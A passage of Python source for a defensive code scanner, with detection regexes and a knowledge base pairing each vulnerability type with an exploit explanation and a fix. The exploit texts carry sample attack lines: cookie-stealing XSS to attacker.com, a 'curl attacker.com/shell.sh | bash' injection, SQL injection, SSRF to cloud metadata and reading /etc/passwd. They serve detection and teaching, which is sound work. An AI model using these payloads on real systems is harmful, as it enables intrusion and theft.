    "Missing Rate Limit":           r"""app\.(?:post|get|put|delete)\s*\(['"]/(?:login|signup|register|auth|reset|forgot)""",
    "Reflected XSS Sink":           r"res\.(?:send|write|end)\s*\([^)]*req\.",
    "XXE via XML Parse":            r"(?i)\b(?:DOMParser|parseXML|libxml|XMLReader)\b",
    # Catches: exec(`ping -c 1 ${host}`) and exec(`nmap ${target}`)
    "Shell Injection via Template": r"(?i)(?:exec|execSync|spawn)\s*\(`[^`]*\$\{",
    # Weak sanitisation: .replace(';', '') doesn't stop all injection
    "Insufficient Input Sanitization": r"\.replace\s*\(\s*['\"][;|&`$]['\"]",
}

_SENSITIVE_RAW = {
    "Email Address":  r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,}",
    "Password Value": r"""(?i)password\s*[:=]\s*['"][^'"]{4,}['"]""",
    "Credit Card":    r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b",
    "SSN":            r"\b\d{3}-\d{2}-\d{4}\b",
    "Phone Number":   r"\b(?:\+91|0)?[6-9]\d{9}\b|(?<![0-9.])\d{3}[.\-\s]\d{3}[.\-\s]\d{4}(?![0-9.])",
}


def _compile(raw_dict):
    """Compile a name→pattern dict into a name→regex dict."""
    compiled = {}
    for name, pat in raw_dict.items():
        try:
            compiled[name] = re.compile(pat)
        except re.error as exc:
            print(f"[!] Bad regex for '{name}': {exc}", file=sys.stderr)
    return compiled


def _compile_list(raw_list):
    out = []
    for pat in raw_list:
        try:
            out.append(re.compile(pat))
        except re.error as exc:
            print(f"[!] Bad endpoint regex: {exc}", file=sys.stderr)
    return out


SECRET_PATTERNS   = _compile(_SECRET_RAW)
CONFIG_PATTERNS   = _compile(_CONFIG_RAW)
LOGIC_PATTERNS    = _compile(_LOGIC_RAW)
SENSITIVE_PATTERNS= _compile(_SENSITIVE_RAW)
ENDPOINT_PATTERNS = _compile_list(_ENDPOINT_RAW)


# ==============================================================================
# VULNERABILITY KNOWLEDGE BASE
# ==============================================================================

VULN_INFO = {

    # ---------- SECRETS -------------------------------------------------------

    "AWS Access Key": {
        "severity": "CRITICAL",
        "exploit": (
            "An attacker can use the key directly with the AWS CLI:\n"
            "  aws configure\n"
            "  aws s3 ls\n"
            "  aws iam list-users\n"
            "  aws sts get-caller-identity\n"
            "If the associated IAM role has broad permissions, full account takeover is possible."
        ),
        "fix": (
            "1. Go to AWS Console > Security Credentials and revoke the key immediately.\n"
            "2. Remove the key from source code and purge it from commit history (use git filter-repo).\n"
            "3. Store credentials in AWS Secrets Manager or as environment variables.\n"
            "4. Add .env to .gitignore before the next commit.\n"
            "5. Install git-secrets or trufflehog as a pre-commit hook to prevent future leaks."
        ),
    },

    "Google API Key": {
        "severity": "HIGH",
        "exploit": (
            "The key can be used directly in API calls:\n"
            "  curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key=STOLEN'\n"
            "Billing is charged to the victim's Google Cloud account.\n"
            "Depending on enabled APIs, the attacker may also access Drive, Gmail, or Cloud Storage."
        ),
        "fix": (
            "1. Go to Google Cloud Console > APIs & Services > Credentials and restrict or rotate the key.\n"
            "2. Set HTTP referrer or IP address restrictions on the key.\n"
            "3. Move the key to a backend proxy so it never appears in client-side code.\n"
            "4. Enable billing alerts to detect abnormal usage."
        ),
    },

    "JWT Token": {
        "severity": "HIGH",
        "exploit": (
            "Paste the token at jwt.io to decode the payload without any secret.\n"
            "If the server accepts 'alg: none', forge a token with any claims (e.g. admin: true)\n"
            "by stripping the signature entirely.\n"
            "A stolen valid token can be replayed against the API until it expires."
        ),
        "fix": (
            "1. Never hardcode tokens in source code.\n"
            "2. Use short expiry times (15 minutes) combined with refresh-token rotation.\n"
            "3. Reject 'alg: none' on the server side; prefer RS256 over HS256.\n"
            "4. Store tokens in HttpOnly cookies, not localStorage."
        ),
    },

    "Bearer Token": {
        "severity": "HIGH",
        "exploit": (
            "Use the token to impersonate the user against any endpoint:\n"
            "  curl -H 'Authorization: Bearer STOLEN_TOKEN' https://api.target.com/profile\n"
            "Remains valid until the token expires or is revoked."
        ),
        "fix": (
            "1. Store tokens in environment variables, never in source code.\n"
            "2. Implement token rotation and short TTLs.\n"
            "3. Consider IP binding or device fingerprinting for high-value tokens."
        ),
    },

    "Private Key Block": {
        "severity": "CRITICAL",
        "exploit": (
            "A stolen private key enables:\n"
            "  ssh -i stolen_key.pem user@server\n"
            "  openssl rsautl -decrypt -inkey stolen.pem -in ciphertext.bin\n"
            "  Signing arbitrary code or TLS certificates with the key."
        ),
        "fix": (
            "1. Revoke the key pair immediately at every service that uses it.\n"
            "2. Use HashiCorp Vault, AWS KMS, or Azure Key Vault for key storage.\n"
            "3. Private keys must never be committed to version control under any circumstances."
        ),
    },

    "Generic Secret": {
        "severity": "HIGH",
        "exploit": (
            "Hardcoded credentials are directly readable by anyone with access to the source code,\n"
            "build artifacts, or compiled bundles. The attacker uses them to authenticate to the\n"
            "referenced service without any additional steps."
        ),
        "fix": (
            "1. Replace hardcoded values with process.env.VAR or a dotenv library.\n"
            "2. Add .env to .gitignore.\n"
            "3. Integrate trufflehog or gitleaks in your CI/CD pipeline to block future leaks."
        ),
    },

    "Slack Token": {
        "severity": "HIGH",
        "exploit": (
            "With a valid Slack token an attacker can:\n"
            "  curl -H 'Authorization: Bearer xoxb-STOLEN' https://slack.com/api/conversations.list\n"
            "  curl -H 'Authorization: Bearer xoxb-STOLEN' https://slack.com/api/files.list\n"
            "Read all messages, download files, and post messages as the bot."
        ),
        "fix": (
            "1. Revoke the token from the Slack Admin dashboard immediately.\n"
            "2. Store bot tokens in environment variables.\n"
            "3. Request only the minimum OAuth scopes required by the integration."
        ),
    },

    "GitHub Token": {
        "severity": "CRITICAL",
        "exploit": (
            "A leaked PAT allows the attacker to:\n"
            "  git clone https://TOKEN@github.com/org/private-repo\n"
            "  curl -H 'Authorization: token STOLEN' https://api.github.com/user/repos\n"
            "Read private repositories, exfiltrate Actions secrets, push malicious commits."
        ),
        "fix": (
            "1. Revoke the token at GitHub > Settings > Developer settings > Personal access tokens.\n"
            "2. Use fine-grained tokens scoped to the minimum required permissions.\n"
            "3. Enable secret scanning in GitHub Advanced Security."
        ),
    },

    "Stripe Live Key": {
        "severity": "CRITICAL",
        "exploit": (
            "A Stripe live secret key allows an attacker to:\n"
            "  curl -u sk_live_STOLEN: https://api.stripe.com/v1/charges -d amount=9999 -d currency=usd\n"
            "Create charges, issue refunds to attacker-controlled accounts, and read customer PII."
        ),
        "fix": (
            "1. Rotate the key immediately in the Stripe Dashboard > Developers.\n"
            "2. The secret key must only exist on the server side, never in client code or repositories.\n"
            "3. Use restricted keys with only the permissions the integration actually needs."
        ),
    },

    "Firebase API Key": {
        "severity": "MEDIUM",
        "exploit": (
            "The Firebase API key itself is semi-public, but if Security Rules are misconfigured\n"
            "an attacker can read or write to the Realtime Database or Firestore:\n"
            "  fetch('https://PROJECT.firebaseio.com/.json')  // unauthenticated read\n"
            "Authentication bypass is also possible if email enumeration is allowed."
        ),
        "fix": (
            "1. Tighten Firebase Security Rules so only authenticated users can read/write.\n"
            "2. Disable email enumeration in Firebase Auth settings.\n"
            "3. Restrict the API key to specific referrer domains in the Google Cloud Console."
        ),
    },

    # ---------- ENDPOINTS -----------------------------------------------------

    "Endpoint": {
        "severity": "MEDIUM",
        "exploit": (
            "Exposed endpoints provide an attack surface:\n"
            "  /admin/*  -> brute-force admin panels or enumerate admin functions\n"
            "  /debug    -> stack traces and internal configuration leakage\n"
            "  /api/*    -> IDOR attacks by changing resource IDs in requests\n"
            "  /swagger  -> full API schema, making fuzzing and IDOR trivial"
        ),
        "fix": (
            "1. Remove or protect /debug and /admin behind strong authentication in production.\n"
            "2. Apply authentication and authorisation checks on every API endpoint.\n"
            "3. Add rate limiting to all public-facing routes.\n"
            "4. Disable Swagger/OpenAPI documentation in production builds."
        ),
    },

    # ---------- CONFIG --------------------------------------------------------

    "Debug Enabled": {
        "severity": "HIGH",
        "exploit": (
            "Debug mode exposes stack traces, environment variables, database query logs,\n"
            "and internal file paths in HTTP error responses. An attacker triggers an error\n"
            "intentionally (e.g. malformed input) to harvest this information."
        ),
        "fix": (
            "1. Set DEBUG=False in all production configuration files.\n"
            "2. Use environment-specific config files (.env.production, .env.development).\n"
            "3. Return generic error messages to clients; log detailed errors server-side only."
        ),
    },

    "Dev Environment": {
        "severity": "MEDIUM",
        "exploit": (
            "Running with NODE_ENV=development typically enables:\n"
            "  - Verbose error output and source maps exposed to the client\n"
            "  - Relaxed CORS policies\n"
            "  - Hot-reload endpoints that may leak file paths\n"
            "  - Disabled security middleware (e.g. helmet)"
        ),
        "fix": (
            "1. Set NODE_ENV=production at deployment time via your CI/CD pipeline.\n"
            "2. Use separate .env files per environment and never commit them.\n"
            "3. Explicitly enable all security middleware regardless of NODE_ENV."
        ),
    },

    "Internal IP": {
        "severity": "MEDIUM",
        "exploit": (
            "Hardcoded internal IP addresses reveal network topology. If an attacker\n"
            "gains any foothold (e.g. via SSRF), they can directly target these addresses.\n"
            "Internal services often have weaker authentication than public ones."
        ),
        "fix": (
            "1. Replace hardcoded IPs with DNS-based service discovery (Consul, Kubernetes DNS).\n"
            "2. Store hostnames in environment variables.\n"
            "3. Segment internal services with firewall rules so they are unreachable from untrusted zones."
        ),
    },

    "CORS Wildcard": {
        "severity": "HIGH",
        "exploit": (
            "With Access-Control-Allow-Origin: * any website can make cross-origin requests\n"
            "to this API. Combined with credentialed requests this enables CSRF-style attacks\n"
            "that read sensitive API responses from a victim's active browser session."
        ),
        "fix": (
            "1. Replace * with an explicit allowlist of trusted origins.\n"
            "2. Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true.\n"
            "3. Validate the Origin header server-side against a known list."
        ),
    },

    "Hardcoded DB URL": {
        "severity": "CRITICAL",
        "exploit": (
            "Database connection strings typically contain credentials. Anyone who reads\n"
            "the source code can connect to the database directly:\n"
            "  mongosh 'mongodb://admin:password@db.internal:27017/prod'\n"
            "This gives full read/write access to all application data."
        ),
        "fix": (
            "1. Move the connection string to an environment variable (DATABASE_URL).\n"
            "2. Use a secrets manager (Vault, AWS Secrets Manager) in production.\n"
            "3. Restrict database network access to application server IPs only."
        ),
    },

    "Verbose Errors": {
        "severity": "MEDIUM",
        "exploit": (
            "Verbose error output leaks stack traces, framework versions, file paths,\n"
            "and sometimes query strings to clients. Attackers use this to identify\n"
            "vulnerable library versions and craft targeted exploits."
        ),
        "fix": (
            "1. Disable verbose error output in production.\n"
            "2. Use a centralised logging service (e.g. Sentry) that captures full errors\n"
            "   server-side without exposing them to the client.\n"
            "3. Return standardised error objects with no internal details."
        ),
    },

    "HTTP not HTTPS": {
        "severity": "HIGH",
        "exploit": (
            "HTTP traffic is sent in cleartext. A network attacker (same Wi-Fi, ISP,\n"
            "or rogue router) can intercept and read all data passively,\n"
            "or modify responses in transit (man-in-the-middle)."
        ),
        "fix": (
            "1. Use HTTPS for all external URLs.\n"
            "2. Set the Strict-Transport-Security (HSTS) header with a long max-age.\n"
            "3. Redirect all HTTP traffic to HTTPS at the load balancer level."
        ),
    },

    "SSL Verification Off": {
        "severity": "CRITICAL",
        "exploit": (
            "Disabling SSL certificate verification means the application accepts\n"
            "any certificate, including self-signed or attacker-controlled ones.\n"
            "A man-in-the-middle can intercept and read all TLS traffic transparently."
        ),
        "fix": (
            "1. Never set ssl_verify=False or rejectUnauthorized=false in production code.\n"
            "2. If using a self-signed certificate in development, add it to the trust store\n"
            "   rather than disabling verification globally.\n"
            "3. Use a CA-signed certificate in all production environments."
        ),
    },

    "Insecure Cookie": {
        "severity": "HIGH",
        "exploit": (
            "Cookies without the Secure flag are transmitted over plain HTTP, allowing\n"
            "network eavesdroppers to steal session tokens. Cookies without HttpOnly can\n"
            "be read by malicious JavaScript via document.cookie (XSS escalation)."
        ),
        "fix": (
            "1. Always set Secure: true on cookies containing sensitive data.\n"
            "2. Always set HttpOnly: true to prevent JavaScript access.\n"
            "3. Add the SameSite attribute (Strict or Lax) to prevent CSRF."
        ),
    },

    "Hardcoded Port": {
        "severity": "LOW",
        "exploit": (
            "Hard-coding a well-known port (80, 8080, 3000, 5000) prevents runtime\n"
            "configuration and may expose the service on an unintended interface\n"
            "in containerised or cloud environments."
        ),
        "fix": (
            "1. Read the port from process.env.PORT.\n"
            "2. Provide a sensible default: const port = process.env.PORT || 3000."
        ),
    },

    # ---------- LOGIC FLAWS ---------------------------------------------------

    "Client-side Auth Bypass": {
        "severity": "CRITICAL",
        "exploit": (
            "Authentication state stored only in the browser can be overwritten in seconds:\n"
            "  In DevTools Console:  localStorage.setItem('isAuthenticated', 'true')\n"
            "  Or directly:          isAuthenticated = true\n"
            "The server never re-validates the flag, so the attacker gains full access."
        ),
        "fix": (
            "1. Perform authentication checks exclusively on the server for every request.\n"
            "2. Use signed session tokens or JWTs that the server validates on each call.\n"
            "3. Never trust any value that the client can set or modify."
        ),
    },

    "Client-side Role Check": {
        "severity": "CRITICAL",
        "exploit": (
            "A role value stored in the browser is trivially overwritten:\n"
            "  In DevTools Console:  user.role = 'admin'\n"
            "The UI then renders admin features and the server accepts requests because\n"
            "it performs no independent role check."
        ),
        "fix": (
            "1. Validate the user's role on the server for every privileged API call.\n"
            "2. Embed role information in a server-signed JWT and verify the signature.\n"
            "3. Apply the principle of least privilege: deny by default, allow explicitly."
        ),
    },

    "Payment Amount Bypass": {
        "severity": "CRITICAL",
        "exploit": (
            "If the server trusts the amount value sent by the client:\n"
            "  POST /checkout  {\"amount\": 0}   -> free purchase\n"
            "  POST /checkout  {\"amount\": -1}  -> potential credit to attacker account\n"
            "This is a classic business-logic vulnerability."
        ),
        "fix": (
            "1. Calculate the total amount on the server from the cart stored server-side.\n"
            "2. Reject any request where the client-supplied amount differs from the server total.\n"
            "3. Enforce a minimum positive value and validate currency and precision."
        ),
    },

    "Unsafe eval()": {
        "severity": "HIGH",
        "exploit": (
            "If any user-controlled data reaches eval(), the attacker achieves Remote Code Execution:\n"
            "  eval(\"require('child_process').execSync('cat /etc/passwd').toString()\")\n"
            "Even indirect paths such as JSON from an API or URL parameters are sufficient."
        ),
        "fix": (
            "1. Remove all uses of eval().\n"
            "2. Use JSON.parse() for deserialising data.\n"
            "3. Avoid new Function(), setTimeout(string), and setInterval(string) for the same reason."
        ),
    },

    "Unsafe new Function()": {
        "severity": "HIGH",
        "exploit": (
            "new Function(userInput) is equivalent to eval() and allows arbitrary code execution\n"
            "if any part of the argument is attacker-controlled."
        ),
        "fix": (
            "1. Avoid new Function() entirely.\n"
            "2. Use structured data (JSON) and explicit logic instead of dynamic code generation."
        ),
    },

    "Direct innerHTML Write": {
        "severity": "HIGH",
        "exploit": (
            "Writing untrusted data to innerHTML injects arbitrary HTML and scripts:\n"
            "  element.innerHTML = userInput\n"
            "  // if userInput = \"<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>\"\n"
            "This causes Stored or Reflected XSS depending on where the data originates."
        ),
        "fix": (
            "1. Use textContent or innerText when inserting plain text.\n"
            "2. If HTML output is necessary, sanitise with DOMPurify before assignment:\n"
            "     element.innerHTML = DOMPurify.sanitize(userInput)\n"
            "3. Apply a Content Security Policy (CSP) header to limit script execution."
        ),
    },

    "dangerouslySetInnerHTML": {
        "severity": "HIGH",
        "exploit": (
            "React's dangerouslySetInnerHTML bypasses the framework's XSS protection.\n"
            "If user-supplied data is passed in without sanitisation, any embedded\n"
            "script or event handler will execute in the victim's browser."
        ),
        "fix": (
            "1. Sanitise the value with DOMPurify before passing it:\n"
            "     dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }}\n"
            "2. Prefer rendering content as text nodes wherever possible.\n"
            "3. Implement a strict CSP to reduce the impact of any remaining XSS."
        ),
    },

    "SQL String Concatenation": {
        "severity": "CRITICAL",
        "exploit": (
            "Building SQL queries by string concatenation enables SQL Injection:\n"
            "  username = \"admin' OR '1'='1\"\n"
            "  query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"\n"
            "The WHERE clause always evaluates to true, returning all rows.\n"
            "More advanced payloads can DROP tables, exfiltrate data, or execute OS commands."
        ),
        "fix": (
            "1. Use parameterised queries / prepared statements exclusively.\n"
            "2. Use an ORM (Sequelize, Prisma, TypeORM) which handles escaping automatically.\n"
            "3. Apply the principle of least privilege to the database account."
        ),
    },

    "Command Injection Sink": {
        "severity": "CRITICAL",
        "exploit": (
            "If user input reaches a shell execution function, arbitrary OS commands run:\n"
            "  filename = 'report.pdf; curl https://attacker.com/shell.sh | bash'\n"
            "  exec('convert ' + filename)  ->  Remote Code Execution\n"
            "The attacker gains the privileges of the web server process."
        ),
        "fix": (
            "1. Avoid shell execution functions whenever possible.\n"
            "2. When process calls are necessary, pass arguments as an array (no shell interpolation):\n"
            "     execFile('convert', [filename], callback)\n"
            "3. Validate and whitelist input strictly before passing it to any process."
        ),
    },

    "Prototype Pollution": {
        "severity": "HIGH",
        "exploit": (
            "Merging or deep-copying attacker-controlled JSON can pollute Object.prototype:\n"
            "  payload: { \"__proto__\": { \"isAdmin\": true } }\n"
            "After the merge, every object in the process has isAdmin=true, enabling\n"
            "privilege escalation or Denial-of-Service depending on how the property is used."
        ),
        "fix": (
            "1. Use Object.create(null) for objects used as hash maps.\n"
            "2. Reject input that contains __proto__, constructor, or prototype keys.\n"
            "3. Use lodash >= 4.17.21 or other patched merge libraries.\n"
            "4. Consider using Map instead of plain objects for untrusted key-value data."
        ),
    },

    "Open Redirect": {
        "severity": "HIGH",
        "exploit": (
            "If a redirect target is read directly from the request, an attacker crafts a URL:\n"
            "  https://trusted-site.com/login?next=https://evil.com/phish\n"
            "The victim sees a trusted domain, then gets redirected to the attacker's page.\n"
            "Commonly used for credential phishing and OAuth token theft."
        ),
        "fix": (
            "1. Validate the redirect target against a whitelist of allowed paths.\n"
            "2. Only allow relative paths (starting with /) as redirect targets.\n"
            "3. Never reflect a URL query parameter directly into a Location header."
        ),
    },

    "Weak Hashing Algorithm": {
        "severity": "HIGH",
        "exploit": (
            "MD5 and SHA-1 are cryptographically broken for password storage:\n"
            "  hashcat -a 0 -m 0   hashes.txt rockyou.txt   # MD5\n"
            "  hashcat -a 0 -m 100 hashes.txt rockyou.txt   # SHA-1\n"
            "Modern GPUs crack billions of MD5 hashes per second. Rainbow tables exist\n"
            "for all common passwords."
        ),
        "fix": (
            "1. Use bcrypt, argon2id, or scrypt for password hashing.\n"
            "2. Use SHA-256 or SHA-3 for general-purpose integrity checking (not passwords).\n"
            "3. If upgrading an existing MD5/SHA-1 password store, re-hash on next login."
        ),
    },

    "Timing-Unsafe Comparison": {
        "severity": "MEDIUM",
        "exploit": (
            "Using == or === to compare secrets takes different amounts of time depending\n"
            "on how many characters match. By measuring response times an attacker can\n"
            "enumerate valid tokens one character at a time (timing oracle attack)."
        ),
        "fix": (
            "1. Use a constant-time comparison function:\n"
            "     Node.js: crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))\n"
            "2. Ensure both strings are the same length before comparing to prevent\n"
            "   early-exit optimisations."
        ),
    },

    "Path Traversal": {
        "severity": "CRITICAL",
        "exploit": (
            "If user-supplied path components are used to construct file paths, an attacker can\n"
            "read arbitrary server files:\n"
            "  GET /file?name=../../etc/passwd\n"
            "This can leak source code, credentials, private keys, or /etc/shadow."
        ),
        "fix": (
            "1. Resolve the full path with path.resolve() and verify it starts with the expected base.\n"
            "2. Reject any input containing '..' or URL-encoded equivalents.\n"
            "3. Use a whitelist of allowed file names or serve files from a safe static directory."
        ),
    },

    "Insecure Deserialization": {
        "severity": "CRITICAL",
        "exploit": (
            "Deserialising untrusted data with unsafe parsers (e.g. yaml.load, pickle.loads)\n"
            "can execute arbitrary code embedded in the payload.\n"
            "  yaml.load('!!python/object/apply:os.system [\"id\"]')  -> RCE"
        ),
        "fix": (
            "1. Use yaml.safe_load() instead of yaml.load().\n"
            "2. Never deserialise pickled data from untrusted sources.\n"
            "3. Validate and schema-check all external data before processing."
        ),
    },

    "Missing Rate Limit": {
        "severity": "MEDIUM",
        "exploit": (
            "Authentication endpoints without rate limiting are vulnerable to:\n"
            "  - Brute-force password attacks (thousands of attempts per second)\n"
            "  - Credential stuffing from leaked password lists\n"
            "  - Account enumeration via timing differences"
        ),
        "fix": (
            "1. Apply rate limiting to all auth endpoints (e.g. express-rate-limit).\n"
            "2. Implement account lockout after N failed attempts.\n"
            "3. Add CAPTCHA on login and registration forms.\n"
            "4. Use a WAF or API gateway with built-in rate limiting."
        ),
    },

    "Reflected XSS Sink": {
        "severity": "HIGH",
        "exploit": (
            "If request data is echoed directly into the response without sanitisation,\n"
            "an attacker can inject a script payload via a crafted URL:\n"
            "  GET /search?q=<script>document.location='https://attacker.com?c='+document.cookie</script>\n"
            "The victim's browser executes the script in the context of the trusted origin."
        ),
        "fix": (
            "1. HTML-encode all user-supplied data before embedding it in responses.\n"
            "2. Use a templating engine that auto-escapes by default (Handlebars, Jinja2 with autoescape).\n"
            "3. Apply a strict Content Security Policy to block inline script execution."
        ),
    },

    "XXE via XML Parse": {
        "severity": "HIGH",
        "exploit": (
            "XML parsers that process external entity declarations allow an attacker to:\n"
            "  - Read arbitrary local files (e.g. /etc/passwd)\n"
            "  - Perform SSRF against internal services\n"
            "  - Cause a Denial-of-Service via the 'billion laughs' entity expansion attack."
        ),
        "fix": (
            "1. Disable external entity processing in your XML parser.\n"
            "2. If possible, switch to a data format that does not support entities (JSON, YAML).\n"
            "3. Validate and schema-check all XML input before parsing."
        ),
    },

    "Hardcoded Session Secret": {
        "severity": "CRITICAL",
        "exploit": (
            "A guessable or leaked session secret lets an attacker forge valid session cookies:\n"
            "  node -e \"require('jsonwebtoken').sign({role:'admin'},'hellcorp_s3cr3t_k3y_2024')\"\n"
            "They can impersonate any user, including administrators, without knowing the password."
        ),
        "fix": (
            "1. Generate a cryptographically random secret (at least 32 bytes):\n"
            "     node -e \"console.log(require('crypto').randomBytes(32).toString('hex'))\"\n"
            "2. Load it from an environment variable: secret: process.env.SESSION_SECRET\n"
            "3. Rotate the secret and invalidate all existing sessions immediately."
        ),
    },

    "SQL Injection (Template Literal)": {
        "severity": "CRITICAL",
        "exploit": (
            "User input is interpolated directly into a SQL string via a template literal:\n"
            "  GET /post/1 OR 1=1--   ->  returns all rows\n"
            "  GET /post/1;DROP TABLE users;--  ->  destroys the database\n"
            "  UNION SELECT username,password,null,null FROM users--  ->  credential dump"
        ),
        "fix": (
            "1. Replace the template literal with a parameterised prepared statement:\n"
            "     db.prepare('SELECT * FROM posts WHERE id = ?').get(id)\n"
            "2. Never interpolate request parameters into SQL strings under any circumstances.\n"
            "3. Use an ORM (Prisma, Sequelize, TypeORM) that prevents raw interpolation."
        ),
    },

    "SSRF Sink": {
        "severity": "CRITICAL",
        "exploit": (
            "The server fetches a URL supplied by the client. An attacker can:\n"
            "  POST /preview  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "  POST /preview  url=http://127.0.0.1:6379/  (internal Redis)\n"
            "  POST /preview  url=http://internal-api/admin/reset\n"
            "This gives read access to cloud metadata, internal services, and secrets."
        ),
        "fix": (
            "1. Maintain an allowlist of permitted domains and reject all others.\n"
            "2. Resolve the hostname and reject private/loopback IP ranges before fetching.\n"
            "3. Use a dedicated egress proxy that enforces the allowlist at the network level.\n"
            "4. Disable redirects or validate the final destination URL after any redirect."
        ),
    },

    "SSRF via fetch/axios": {
        "severity": "CRITICAL",
        "exploit": (
            "Same as SSRF Sink — user-controlled URL passed to fetch() or axios() enables\n"
            "server-side request forgery to internal networks, cloud metadata, or localhost services."
        ),
        "fix": (
            "1. Validate and allowlist URLs before making outbound requests.\n"
            "2. Block requests to 169.254.x.x, 127.x.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x.\n"
            "3. Consider using a dedicated fetch wrapper that enforces these checks."
        ),
    },

    "Information Disclosure (env)": {
        "severity": "CRITICAL",
        "exploit": (
            "The endpoint sends process.env, req.session, or req.headers directly to the client:\n"
            "  GET /api/debug -> exposes all environment variables including database passwords,\n"
            "  API keys, internal hostnames, and session tokens of all active users."
        ),
        "fix": (
            "1. Remove or gate all debug endpoints behind strong authentication.\n"
            "2. Never serialize process.env, req.session, or req.headers into a response.\n"
            "3. Disable or remove debug routes entirely before deploying to production."
        ),
    },

    "Plaintext Password Storage": {
        "severity": "CRITICAL",
        "exploit": (
            "Passwords are stored in plaintext in the database. A single SQL injection or\n"
            "database breach immediately exposes every user's password. Attackers use these\n"
            "for credential stuffing against email, banking, and other services."
        ),
        "fix": (
            "1. Hash passwords before storage using bcrypt or argon2:\n"
            "     const bcrypt = require('bcrypt');\n"
            "     const hash = await bcrypt.hash(password, 12);\n"
            "2. On login, compare using bcrypt.compare() — never compare plaintext.\n"
            "3. Migrate existing plaintext passwords: re-hash on next successful login."
        ),
    },

    "Shell Injection via Template": {
        "severity": "CRITICAL",
        "exploit": (
            "A shell command is built using a template literal with user input:\n"
            "  exec(`ping -c 1 ${host}`)  with host = '8.8.8.8; cat /etc/passwd'\n"
            "  exec(`nmap ${target}`)     with target = '127.0.0.1 | id'\n"
            "The shell interprets the metacharacters, granting arbitrary code execution."
        ),
        "fix": (
            "1. Use execFile() with a separate arguments array — no shell interpolation:\n"
            "     execFile('ping', ['-c', '1', host], callback)\n"
            "2. Validate input against a strict allowlist (e.g. /^[a-zA-Z0-9.+-]+$/).\n"
            "3. Consider whether shelling out is necessary at all; prefer native Node.js APIs."
        ),
    },

    "Insufficient Input Sanitization": {
        "severity": "HIGH",
        "exploit": (
            "Replacing a single character (e.g. ';') does not block all shell injection vectors:\n"
            "  target.replace(';','')  still allows:\n"
            "    127.0.0.1 | id\n"
            "    127.0.0.1 & id\n"
            "    127.0.0.1 `id`\n"
            "    127.0.0.1 $(id)\n"
            "An attacker simply uses a different metacharacter."
        ),
        "fix": (
            "1. Use an allowlist instead of a blocklist: only permit known-safe characters.\n"
            "2. Validate against /^[a-zA-Z0-9.+-]+$/ for hostnames or IPs.\n"
            "3. Prefer execFile() with an argument array over shell string construction."
        ),
    },

    # ---------- SENSITIVE DATA ------------------------------------------------

    "Email Address": {
        "severity": "LOW",
        "exploit": (
            "Email addresses embedded in source code can be harvested for phishing campaigns,\n"
            "spam lists, or targeted social engineering. They also reveal internal staff identities."
        ),
        "fix": (
            "1. Do not commit real email addresses in source code; use placeholders.\n"
            "2. Store contact details in environment variables or a database.\n"
            "3. Ensure GDPR / data-protection obligations are met for any stored PII."
        ),
    },

    "Password Value": {
        "severity": "CRITICAL",
        "exploit": (
            "A plain-text password in source code is immediately usable by any attacker\n"
            "with read access to the repository, build artifacts, or deployed files.\n"
            "Credential stuffing tools will try the password across hundreds of services."
        ),
        "fix": (
            "1. Never store passwords in plain text.\n"
            "2. Hash passwords with bcrypt or argon2id before storing.\n"
            "3. For service passwords, rotate immediately and store in a secrets manager."
        ),
    },

    "Credit Card": {
        "severity": "CRITICAL",
        "exploit": (
            "A raw card number found in source code, logs, or a database can be used\n"
            "for card-not-present fraud immediately. Storing card numbers also constitutes\n"
            "a PCI-DSS violation carrying significant financial penalties."
        ),
        "fix": (
            "1. Never store or log credit card numbers.\n"
            "2. Use a PCI-compliant payment processor (Stripe, Braintree) that handles card data.\n"
            "3. Use tokenisation so your system only ever sees a token, not the real number."
        ),
    },

    "SSN": {
        "severity": "HIGH",
        "exploit": (
            "Social Security Numbers in source code or logs enable identity theft.\n"
            "Attackers use SSNs to open fraudulent credit lines, file false tax returns,\n"
            "and impersonate victims with government agencies."
        ),
        "fix": (
            "1. Mask or truncate SSNs in all logs and interfaces (show only last 4 digits).\n"
            "2. Encrypt SSNs at rest using AES-256 or a dedicated field-level encryption service.\n"
            "3. Restrict access to SSN fields to only the roles that strictly require them."
        ),
    },

    "Phone Number": {
        "severity": "LOW",
        "exploit": (
            "Phone numbers in source code can be used for SMS phishing (smishing),\n"
            "two-factor authentication bypass attempts, or SIM-swapping attacks."
        ),
        "fix": (
            "1. Minimise PII stored in source code; use environment variables or a database.\n"
            "2. Apply appropriate data-retention and GDPR deletion policies.\n"
            "3. Mask phone numbers in logs and error messages."
        ),
    },
}

# Severity ordering for filtering
_SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


# ==============================================================================
# FILE UTILITIES
# ==============================================================================

SCAN_EXTENSIONS = (
    ".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs",
    ".map", ".json", ".txt", ".html", ".htm",
    ".env", ".config", ".yaml", ".yml", ".py",
)

SKIP_DIRECTORIES = {
    "node_modules", "vendor", ".git", "dist", "build",
    "__pycache__", ".next", ".nuxt", "coverage", ".cache",
}

# Lines that start with these tokens are comment-only — skip low-signal checks
_COMMENT_RE = re.compile(r"^\s*(?://|#|/\*|\*)")


def get_files(target):
    files = []
    for root, dirs, filenames in os.walk(target):
        dirs[:] = [d for d in dirs if d not in SKIP_DIRECTORIES]
        for name in filenames:
            if name.endswith(SCAN_EXTENSIONS):
                files.append(os.path.join(root, name))
    return files


def read_file(filepath):
    """Read a file with an enforced size cap to avoid blocking on huge minified files."""
    try:
        size_mb = os.path.getsize(filepath) / (1024 * 1024)
        if size_mb > MAX_FILE_MB:
            print(
                f"  [SKIP] {filepath} ({size_mb:.1f} MB > {MAX_FILE_MB} MB limit)",
                file=sys.stderr,
            )
            return ""
        with open(filepath, "r", errors="ignore") as fh:
            return fh.read()
    except Exception:
        return ""


# ==============================================================================
# SCANNER
# ==============================================================================

def _make_finding(vuln_type, value, filepath, line_no, code_line=""):
    return {"type": vuln_type, "value": value, "file": filepath, "line": line_no, "code_line": code_line}


